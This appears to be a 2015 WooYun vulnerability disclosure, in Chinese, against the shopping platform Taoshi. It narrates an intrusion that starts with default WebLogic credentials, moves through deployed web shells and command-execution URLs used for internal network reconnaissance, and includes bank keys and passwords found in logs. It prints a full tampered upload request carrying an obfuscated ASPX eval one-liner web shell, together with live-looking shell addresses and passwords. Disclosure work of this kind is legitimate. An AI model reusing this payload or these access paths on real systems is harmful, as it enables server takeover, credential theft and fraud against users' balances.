{"id": 26935, "wybug_id": "wooyun-2015-0127302", "wybug_title": "看我如何自由穿梭淘市网", "wybug_corp": "淘市网", "wybug_author": "路人甲", "wybug_date": "2015-07-18 17:53", "wybug_open_date": "2015-09-06 00:00", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-06：\t细节向公众公开  简要描述： 淘市网-中国首家实体店网上购物平台，包括支付网关在内的几台服务器均存在严重漏洞，导致用户帐号密码泄漏，可操作用户平台余额。 详细说明：  淘市网为中国首家实体店网上销售平台，平台所有店家都具有线下实体店，并且具备营业执照、税务登记证、法人代码证以及相关行业资格证书。\n\n说一下我的穿梭过程首先是一台服务弱口令的机器（http://222.73.4.201/），即淘市网支付网关http://222.73.4.201/consoleweblogic弱口令weblogic/weblogic1\n\n通过部署war拿到shell菜刀：http://222.73.4.201/is/index.jsp密码：023菜刀马要手输路径\n\n小马：http://222.73.4.201/is/cmd.jsp?pwd=023&cmd=arp%20-a可内网\n\n在服务器内存放了很多bankKey\n/app/tomcat/bankKey/\n同时在翻阅支付网关日志的时候我找到了这个\n\n并且确定了该网关应属于淘市网日志有很多\n/app/weblogic/logs/\n，在日志内泄漏了很多淘市网的帐号密码，省却了我翻数据库的烦恼\n\n我拿一个用户（212121）来登录看看系统\n\n在帐号管理的账户信息内，我看到了用户头像上传，还看到了我的淘市宝\n\n在此处我们可以转帐到其它淘市宝帐号也可以提现，当然这些有迹可循的事，我是不会干的回到用户头像上传\n\n利用抓包改包，可成功上传aspx文件\nPOST http://seller.taoshi.com/buyer/profiles/modifypic.aspx?operation=pic HTTP/1.1Host: seller.taoshi.comConnection: keep-aliveContent-Length: 400Origin: http://seller.taoshi.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzfRFhxAmrXCsBLIwAccept: */*Referer: http://seller.taoshi.com/buyer/profiles/modifypic.aspxAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: TempID=Cartbdb0aec9-928c-443c-912d-db04445444f1; Cache:CustomerTempID:=4062139; CustomerID=1251; ASP.NET_SessionId=pzpm14jacwnxh0sm1rrbsvec------WebKitFormBoundaryzfRFhxAmrXCsBLIwContent-Disposition: form-data; name=\"name\"01.aspx------WebKitFormBoundaryzfRFhxAmrXCsBLIwContent-Disposition: form-data; name=\"file\"; filename=\"01.aspx\"Content-Type: image/jpeg<%@PAGE LANGUAGE=JSCRIPT%><%var PAY:String=Request[\"\\x61\\x62\\x63\\x64\"];eval(PAY,\"\\x75\\x6E\\x73\\x61\"+\"\\x66\\x65\");%>------WebKitFormBoundaryzfRFhxAmrXCsBLIw--\n一句话地址：http://seller.taoshi.com/Resource/HeadPic/20150717/1987-4403-9016_01.aspx密码：abcd又是一台可内网的服务器\n\n而且看情况是已经被黑了\nD:\\Application\\100MEC\\Resource\\HeadPic\\1b841ae7-8add-438d-b565-ebdaec377b68.cer\n\n\n这台服务器上的内容有点多\n\n什么OA、HR\n\n   漏洞证明：  当然问题不会就这样结束在点击淘市网个人帐号中心http://222.73.4.200/DFHRPortal/account/safe/toAccount.action?nameSpace=%2Faccount%2Fsafe我发现这又是一台weblogic弱口令weblogic/weblogic1\n\n\n\n一样的拿shell过程\n\nshell地址：http://222.73.4.200/is/index.jsp密码：023\n\n\n\n可内网http://222.73.4.200/is/cmd.jsp?pwd=023&cmd=arp%20-a\n\n\n\n又是把密码记录到日志里\n\n暂时就到这吧~明天就峰会了好高兴   修复方案：  强口令，上传点过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-07-22 09:04 厂商回复： 暂未建立与网站管理方的直接处置渠道，待认领。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}